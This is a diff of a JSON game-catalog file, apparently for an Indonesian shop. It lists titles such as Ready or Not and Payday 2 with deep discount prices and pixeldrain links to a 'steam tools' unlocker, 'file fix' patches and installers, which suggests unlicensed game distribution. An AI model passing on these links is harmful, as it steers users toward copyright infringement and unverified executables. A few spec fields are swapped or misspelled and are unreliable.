+        "url": "https://pixeldrain.com/u/CW4Cw7zQ",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T15:03:18.93809+00:00",
+    "genre": "Action, Survival, Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows Vista / 7 / 8",
+        "cpu": "Intel Core 2 Duo 2.4 GHz / AMD Athlon X2",
+        "gpu": "NVIDIA GeForce 8800GTS / ATI Radeon HD 3850",
+        "ram": "2 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "intel Core i5 atau lebih tinggi",
+        "gpu": "GTX 560 / Radeon HD 6950",
+        "ram": "4 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "525f6650-83da-4797-ae6b-ef13b2e63d41",
+    "title": "Demonologist",
+    "price": 165999,
+    "description": "Game Demonologist adalah salah satu permainan horor investigasi yang sedang booming di kalangan pemain game Indonesia. Game ini mengajak pemain untuk berperan sebagai seorang pemburu hantu profesional yang harus memecahkan misteri supernatural dengan berbagai alat dan kemampuan. Dalam permainan ini, taktik, kesabaran, dan kerja sama tim sangat penting untuk berhasil.",
+    "thumbnail": "https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/1929610/header.jpg?t=1761136310",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/Z2Kdh6yb",
+        "icon": "fix",
+        "label": "Fix / Update"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-04-16T11:12:00.533375+00:00",
+    "genre": "Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i5 / i3 generasi baru / AMD setara",
+        "gpu": "NVIDIA GTX 1060 6GB",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i7 / AMD setara",
+        "gpu": "NVIDIA GTX 1660 Super",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 12000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.5904280877608176.zip"
+  },
+  {
+    "id": "3b2e6f49-65ba-487f-9f36-3eb504c9a10d",
+    "title": "Ready or Not",
+    "price": 255999,
+    "description": "Ready or Not adalah game tactical FPS realistis yang menempatkan pemain sebagai anggota tim SWAT dalam berbagai operasi berbahaya seperti penyelamatan sandera, penangkapan kriminal bersenjata, hingga penggerebekan lokasi kejahatan. Game ini menonjolkan gameplay yang penuh strategi dan ketegangan, di mana pemain harus bekerja sama dengan tim, menggunakan perlengkapan taktis, serta mengambil keputusan cepat untuk menyelesaikan misi dengan aman. Dengan suasana yang intens, AI musuh yang realistis, dan mekanik tempur yang detail, Ready or Not memberikan pengalaman bermain yang terasa serius, menegangkan, dan sangat imersif bagi penggemar game shooter taktis.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/71ea8929-295d-35cd-9dbd-750f8f4ab1a3/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "Steamtools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/i5rM3Mn8",
+        "icon": "fix",
+        "label": "File Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "Tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/N1oV85kF",
+        "icon": "guide",
+        "label": "Install Games"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "box",
+        "label": "Tutorial Install"
+      }
+    ],
+    "created_at": "2026-05-11T17:31:55.486711+00:00",
+    "genre": "Co-op, Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "64-bit Windows 7, Windows 8.1, Windows 10",
+        "cpu": "Intel Core i5-4430 / AMD FX-6300",
+        "gpu": "NVIDIA GeForce GTX 960 2GB / AMD Radeon R7 370 2GB",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "64-bit Windows 10",
+        "cpu": "AMD Ryzen 5-1600 / Intel Core i5-7600K",
+        "gpu": "Nvidia GTX 1060 6GB",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "a9a04456-a9e6-4e60-b95e-490c02a4bed2",
+    "title": "Subnautica: Below Zero",
+    "price": 87749,
+    "description": "Subnautica: Below Zero adalah game open-world survival adventure yang membawa pemain kembali ke planet alien 4546B, kali ini di wilayah kutub yang dipenuhi lautan beku, badai salju, dan makhluk laut misterius. Pemain berperan sebagai Robin Ayou yang datang untuk menyelidiki kematian saudarinya sambil bertahan hidup dengan cara mengumpulkan resource, membangun markas, membuat kendaraan, dan menjelajahi kedalaman laut penuh bahaya. Dibanding game pertama, Below Zero memiliki cerita yang lebih fokus, area daratan lebih banyak, serta atmosfer survival dingin yang unik.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/d62ed3a3-a929-375d-8f93-712094dcf50f/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/28m4ucYb",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/RgeS6x7o",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T10:30:08.433442+00:00",
+    "genre": "Open World, Survival, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/10 64-bit",
+        "cpu": "ntel Core i3 / Ryzen 3 (2.6GHz+)",
+        "gpu": "Intel HD 530 / setara",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i5 / Ryzen 5",
+        "gpu": "GTX 1050 Ti / RX 570 (4GB VRAM)",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "e1a6fdae-f966-48e6-8ffe-ab3ec49daac2",
+    "title": "Mad Max",
+    "price": 135999,
+    "description": "Mad Max adalah game open-world action-adventure bertema post-apocalyptic yang mengikuti perjalanan Max Rockatansky di gurun tandus penuh perampok, perang kendaraan, dan perebutan sumber daya. Setelah mobil ikoniknya dicuri oleh kelompok brutal pimpinan Scabrous Scrotus, Max bekerja sama dengan mekanik aneh bernama Chumbucket untuk membangun kendaraan tempur “Magnum Opus” demi bertahan hidup dan membalas dendam. Game ini berfokus pada eksplorasi dunia gurun luas, pertarungan kendaraan brutal, dan combat melee yang terinspirasi dari seri Batman Arkham",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/992b51b1-d0f6-3014-9799-aae76fccab47/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/sMJDXdwZ",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "toturial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/4kbLu2XJ",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T10:54:42.726572+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 64-bit",
+        "cpu": "Intel Core i5-650 / AMD Phenom II X4 965",
+        "gpu": "GTX 660 Ti / Radeon HD 7870",
+        "ram": "6 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7-3770 / AMD FX-8350",
+        "gpu": "GTX 760 / Radeon HD 7970",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "17b3d865-65a3-4c13-9329-5f1955a73a52",
+    "title": "Chained in the Backrooms",
+    "price": 28999,
+    "description": "Chained in the Backrooms adalah game co-op survival horror bertema Backrooms di mana pemain terjebak di dunia labirin aneh penuh ruangan kosong, monster misterius, dan puzzle mematikan. Yang membuat game ini unik adalah para pemain saling terhubung dengan rantai (chain), sehingga kerja sama dan koordinasi menjadi sangat penting untuk bertahan hidup dan menyelesaikan level. Pemain harus menjelajahi area menyeramkan, memecahkan teka-teki, menghindari entitas berbahaya, dan mencari jalan keluar dari Backrooms yang terus berubah.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.Rat5-ZxHVuI60qNOtujY_wAAAA?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/vg4G74HN",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/jL9138SA",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T11:07:00.14045+00:00",
+    "genre": "Survival, Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i5",
+        "gpu": "GTX 1050 Ti",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 (64-bit)",
+        "cpu": "Intel Core i7 / Ryzen 7",
+        "gpu": "GTX 1660 / RTX 2060",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "5bb839ee-c2ca-4985-b388-786c8914d6f3",
+    "title": "Friday the 13th The Game",
+    "price": 698225,
+    "description": "Friday the 13th: The Game adalah game asymmetrical survival horror multiplayer yang terinspirasi dari film horor klasik Friday the 13th. Dalam game ini, satu pemain mengendalikan pembunuh ikonik Jason Voorhees, sementara pemain lain berperan sebagai para counselor yang harus bekerja sama untuk bertahan hidup dan melarikan diri dari Camp Crystal Lake. Pemain dapat memperbaiki kendaraan, memanggil polisi, atau bersembunyi sambil menghindari Jason yang memiliki kemampuan supernatural dan sangat mematikan.",
+    "thumbnail": "https://images.igdb.com/igdb/image/upload/t_cover_big/co20x7.webp",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/oxTcQaR9",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/mT3KZKPU",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T12:09:15.808875+00:00",
+    "genre": "Survival, Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 64-bit",
+        "cpu": "Intel Core i3-530",
+        "gpu": "GTX 650 Ti / Radeon HD 7770",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 ",
+        "cpu": "8 GB",
+        "gpu": "GTX 970 / RX 470",
+        "ram": "Intel Core i5-6600"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "333efe71-205f-4e7f-b7f3-a102dceb00e9",
+    "title": "Unravel Two Unravel Two",
+    "price": 239000,
+    "description": "Unravel Two adalah game puzzle-platformer co-op yang mengikuti dua karakter kecil dari benang wol bernama Yarny dalam petualangan emosional penuh teka-teki dan eksplorasi. Kedua karakter terhubung oleh benang yang digunakan untuk berayun, memanjat, menarik objek, dan membantu satu sama lain melewati berbagai rintangan di dunia yang terinspirasi dari alam dan lingkungan nyata. Game ini berfokus pada kerja sama, kreativitas, dan suasana santai dengan visual indah serta musik yang menenangkan.",
+    "thumbnail": "https://th.bing.com/th/id/OIP.S1JDJ1TwmMPwAfXwL1c7GAHaJ4?w=122&h=180&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "stem tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/xeCEPVUp",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/nHpAjqoH",
+        "icon": "box",
+        "label": "install games"
+      }
+    ],
+    "created_at": "2026-05-15T12:33:25.183019+00:00",
+    "genre": "Co-op, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 64-bit",
+        "cpu": "Intel i3 2120 / AMD FX-4300",
+        "gpu": "GTX 650 / Radeon HD 7750",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 11 64-bit",
+        "cpu": "Intel i5 2300 / Ryzen 3",
+        "gpu": "GTX 750 Ti / RX 560",
+        "ram": "6 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "0404c8d9-0193-461f-a2d9-529e3f7d3b60",
+    "title": "Payday 2",
+    "price": 42250,
+    "description": "Payday 2 adalah game co-op action FPS yang berfokus pada aksi perampokan bersama tim kriminal bernama PAYDAY Gang. Pemain bekerja sama menyelesaikan berbagai misi seperti mencuri uang, menyusup ke gedung, membobol bank, menyelamatkan sandera, hingga menghadapi polisi dalam baku tembak intens. Game ini terkenal karena gameplay co-op yang seru, sistem progression mendalam, serta banyak pilihan build karakter, senjata, dan strategi untuk menyelesaikan misi secara diam-diam maupun penuh aksi.",
+    "thumbnail": "https://th.bing.com/th/id/OIP.VcNpYKpY_JqE69Cc8NksnQHaLH?w=115&h=180&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/irL3ZsqS",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "guide",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/AN7wK6pM",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-15T12:41:55.344961+00:00",
+    "genre": "Co-op, Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7 64-bit",
+        "cpu": "Intel Dual Core 2.4 GHz",
+        "gpu": "NVIDIA 8800 GT / ATI Radeon HD 2600",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i5",
+        "gpu": "GTX 460 / Radeon HD 5850",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "4716a865-6c8a-47ab-8f6f-66e029554fe9",
+    "title": "SCP: 5K",
+    "price": 165999,
+    "description": "SCP: 5K adalah game tactical horror FPS bertema dunia SCP Foundation, di mana pemain menjadi anggota pasukan khusus yang terjebak dalam konspirasi besar setelah SCP Foundation berubah menjadi ancaman bagi umat manusia. Pemain harus menyusup ke fasilitas rahasia, melawan anomali SCP mengerikan, dan bertahan hidup dalam operasi militer penuh ketegangan. Game ini menggabungkan elemen tactical shooter realistis dengan horror atmosferik dan gameplay co-op yang intens.",
+    "thumbnail": "data:image/webp;base64,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